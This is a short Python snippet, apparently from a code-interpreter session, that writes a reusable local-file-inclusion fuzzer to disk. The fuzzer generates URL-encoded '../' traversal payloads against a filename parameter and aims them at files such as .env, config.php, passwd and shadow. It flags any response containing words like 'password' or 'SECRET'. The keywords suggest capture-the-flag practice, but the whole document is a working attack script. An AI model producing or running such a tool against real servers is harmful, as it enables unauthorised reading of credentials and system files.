import os

# Write a reusable LFI fuzz script with smart payloads
lfi_script = """
#!/usr/bin/env python3
import requests
from urllib.parse import quote

# === CONFIG ===
TARGET_URL = "https://example.com/dog?filename="  # Replace with target
MATCH_KEYWORDS = ["flag", "key", "password", "Liber8", "{", "SKY-", "SECRET"]
MAX_DEPTH = 6

# === COMMON FILE TARGETS ===
FILENAMES = [
    "flag.txt",
    "secret.txt",
    "key.txt",
    ".env",
    "config.php",
    "index.php",
    "passwd",
    "shadow",
]

def generate_payloads():
    payloads = []
    for depth in range(1, MAX_DEPTH + 1):
        prefix = "../" * depth
        for fname in FILENAMES:
            payloads.append(quote(prefix + fname))
    return payloads

def test_payloads():
    print("[*] Starting LFI scan...")
    for payload in generate_payloads():
        url = TARGET_URL + payload
        try:
            response = requests.get(url, timeout=5)
            text = response.text.strip()
            if any(keyword.lower() in text.lower() for keyword in MATCH_KEYWORDS):
                print(f"🚩 Possible match for {payload}:")
                print("-" * 60)
                print(text[:500])  # limit output size
                print("-" * 60)
        except Exception as e:
            print(f"[!] Error with payload {payload}: {e}")

if __name__ == "__main__":
    test_payloads()
"""

script_path = "/mnt/data/lfi_fuzzer.py"
with open(script_path, "w") as f:
    f.write(lfi_script)

script_path
